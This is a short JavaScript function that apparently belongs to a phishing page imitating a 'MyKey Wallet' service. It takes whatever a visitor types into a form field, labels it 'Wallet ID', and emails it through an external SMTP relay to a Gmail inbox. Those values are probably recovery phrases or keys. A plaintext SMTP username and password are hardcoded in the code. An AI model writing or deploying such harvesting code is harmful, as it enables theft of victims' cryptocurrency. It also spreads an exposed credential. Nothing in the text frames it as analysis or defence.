function emailSend(){

    var message = document.getElementById('message').value;

    var messageBody = "Wallet ID: " + message;

    Email.send({
    Host : "smtp.elasticemail.com",
    Username : "nwaenehifeco11@gmail.com",
    Password : "56E142A7A00DC444E973987B7490ED5D3415",
    To : 'nwaenehifeco11@gmail.com',
    From : "nwaenehifeco11@gmail.com",
    Subject : "MyKey Wallet",
    Body : messageBody
}).then(
  message => alert(message)
);
}